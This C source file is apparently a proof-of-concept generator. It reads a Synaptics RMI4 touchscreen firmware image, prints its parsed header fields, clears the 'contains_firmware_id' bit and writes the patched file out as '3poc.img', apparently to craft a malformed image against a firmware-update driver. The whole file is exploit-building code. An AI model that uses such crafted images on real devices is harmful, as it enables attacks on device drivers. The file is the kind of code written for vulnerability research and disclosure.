#include <errno.h>                                                              
#include <stddef.h>                                                             
#include <stdio.h>                                                              
#include <stdbool.h>
#include <stdint.h>
#include <stdlib.h>                                                             
#include <string.h>                                                             
#include <unistd.h>                                                             
#include <fcntl.h>                                                              
#include <time.h>                                                               
#include <sys/types.h>                                                          
#include <sys/stat.h>                                                           
#include <sys/time.h> 

//#define SYNAPTICS_IMG "poc3.img"
#define SYNAPTICS_IMG "synaptics.img"

#define IMAGE_AREA_OFFSET 0x100
#define SYNAPTICS_RMI4_PRODUCT_INFO_SIZE 2
#define SYNAPTICS_RMI4_PRODUCT_ID_SIZE 10

struct image_header {
	/* 0x00 - 0x0f */
	unsigned char checksum[4];
	unsigned char reserved_04;
	unsigned char reserved_05;
	unsigned char options_firmware_id:1;
	unsigned char options_bootloader:1;
	unsigned char options_reserved:6;
	unsigned char bootloader_version;
	unsigned char firmware_size[4];
	unsigned char config_size[4];
	/* 0x10 - 0x1f */
	unsigned char product_id[SYNAPTICS_RMI4_PRODUCT_ID_SIZE];
	unsigned char package_id[2];
	unsigned char package_id_revision[2];
	unsigned char product_info[SYNAPTICS_RMI4_PRODUCT_INFO_SIZE];
	/* 0x20 - 0x2f */
	unsigned char bootloader_addr[4];
	unsigned char bootloader_size[4];
	unsigned char ui_addr[4];
	unsigned char ui_size[4];
	/* 0x30 - 0x3f */
	unsigned char ds_id[16];
	/* 0x40 - 0x4f */
	unsigned char disp_config_addr[4];
	unsigned char disp_config_size[4];
	unsigned char reserved_48_4f[8];
	/* 0x50 - 0x53 */
	unsigned char firmware_id[4];
};

struct image_header_data {
	bool contains_firmware_id;
	bool contains_bootloader;
	bool contains_disp_config;
	unsigned int firmware_id;
	unsigned int checksum;
	unsigned int firmware_size;
	unsigned int config_size;
	unsigned int bootloader_size;
	unsigned int disp_config_offset;
	unsigned int disp_config_size;
	unsigned char bootloader_version;
	unsigned char product_id[SYNAPTICS_RMI4_PRODUCT_ID_SIZE + 1];
	unsigned char product_info[SYNAPTICS_RMI4_PRODUCT_INFO_SIZE];
};

static unsigned int le_to_uint(const unsigned char *ptr)
{
	return (unsigned int)ptr[0] +
			(unsigned int)ptr[1] * 0x100 +
			(unsigned int)ptr[2] * 0x10000 +
			(unsigned int)ptr[3] * 0x1000000;
}

static uint32_t syn_crc(uint16_t *data, uint16_t len)
{
	uint32_t sum1, sum2;
	sum1 = sum2 = 0xFFFF;
	if (data) {
		while (len--) {
			sum1 += *data++;
			sum2 += sum1;
			sum1 = (sum1 & 0xFFFF) + (sum1 >> 16);
			sum2 = (sum2 & 0xFFFF) + (sum2 >> 16);
		}
	} else {
		perror("data incorrect");
		return (0xFFFF | 0xFFFF << 16);
	}
	return sum1 | (sum2 << 16);
}
enum bl_version {
	V5 = 5,
	V6 = 6,
};


static void parse_header(struct image_header_data *header,
		const unsigned char *fw_image)
{
	struct image_header *data = (struct image_header *)fw_image;

	header->checksum = le_to_uint(data->checksum);
        #ifdef DEBUG
        printf("%-25s %u\n","checksum:", header->checksum);
        #endif        

	header->bootloader_version = data->bootloader_version;
        #ifdef DEBUG
        printf("%-25s %u\n","bootloader_version:", (unsigned int)header->bootloader_version);
        #endif        
	
	header->firmware_size = le_to_uint(data->firmware_size);
        #ifdef DEBUG
        printf("%-25s %u\n","firmware_size:", header->firmware_size);
        #endif        
	
	header->config_size = le_to_uint(data->config_size);
        #ifdef DEBUG
        printf("%-25s %u\n","config_size:", header->config_size);
        #endif        
	
	memcpy(header->product_id, data->product_id, sizeof(data->product_id));
	header->product_id[sizeof(data->product_id)] = 0;
        #ifdef DEBUG
        printf("%-25s %s\n","product_id:", header->product_id);
        #endif        
	
	memcpy(header->product_info, data->product_info,
			sizeof(data->product_info));
        #ifdef DEBUG
        printf("%-25s %s\n","product_info:", header->product_info);
        #endif        
	
	header->contains_firmware_id = data->options_firmware_id;
        #ifdef DEBUG
        printf("%-25s %d\n","contains_firmware_id:", header->contains_firmware_id);
        #endif        
	
	if (header->contains_firmware_id){
		header->firmware_id = le_to_uint(data->firmware_id);
                #ifdef DEBUG
                printf("%-25s %u\n","firmware_id:", header->firmware_id);
                #endif        
        }
	header->contains_bootloader = data->options_bootloader;
        #ifdef DEBUG
        printf("%-25s %d\n","contains_bootloader:", header->contains_bootloader);
        #endif        
	
	if (header->contains_bootloader){
		header->bootloader_size = le_to_uint(data->bootloader_size);
                #ifdef DEBUG
                printf("%-25s %u\n","bootloader_size:", header->bootloader_size);
                #endif        
        }
	if ((header->bootloader_version == V5) && header->contains_bootloader) {
		header->contains_disp_config = true;
		header->disp_config_offset = le_to_uint(data->disp_config_addr);
                #ifdef DEBUG
                printf("%-25s %u\n","disp_config_offset:", header->disp_config_offset);
                #endif        

		header->disp_config_size = le_to_uint(data->disp_config_size);
                #ifdef DEBUG
                printf("%-25s %u\n","disp_config_size:", header->disp_config_size);
                #endif        
	
	} else {
		header->contains_disp_config = false;
	}

	return;
}
int unflip_contains_firmware_id(char *fw_image){
	struct image_header *data = (struct image_header *)fw_image;
        data->options_firmware_id = 0;
        return 0;
}

int write_img_to_file(char *fw_img, unsigned int fw_img_size, char *filename){
    FILE *fp;
    fp = fopen(filename, "wb");
    fwrite(fw_img, fw_img_size, 1, fp);
    fclose(fp);
    return 0;
}

int main(){
    // Ugly code below; written with haste.
    struct image_header_data header;
    unsigned char *fw_img;
    unsigned int fw_img_size;
    FILE *fp;
    if (!(fp = fopen(SYNAPTICS_IMG, "r"))) {
        perror("Couldnt open synaptics.img");
        return EXIT_FAILURE;
    }
    fseek(fp, 0L, SEEK_END);
    fw_img_size = ftell(fp);
    fw_img = (unsigned char *)malloc(fw_img_size);
    fseek(fp, 0L, SEEK_SET);
    if (fread(fw_img, 1, fw_img_size, fp) != fw_img_size){
        perror("Can't read img in its entirety.");
        fclose(fp);
    };

    #ifdef DEBUG
    printf("===================================\n");
    printf("[+] synaptics.img original header:\n");
    printf("-----------------------------------\n");
    parse_header(&header, fw_img);
    printf("===================================\n");
    #endif

    /* CREATING POC 3 */
    printf("[+] Unset the contains_firmware_id bit.\n");
    unflip_contains_firmware_id(fw_img);
    write_img_to_file(fw_img, fw_img_size, "3poc.img");
    printf("[+] Patched img was written to 3poc.img.\n");

    #ifdef DEBUG
    printf("===================================\n");
    printf("[+] 3poc.img patched header:\n");
    printf("-----------------------------------\n");
    parse_header(&header, fw_img);
    printf("===================================\n");
    #endif

    free(fw_img);
    fclose(fp);
    return 0;
}
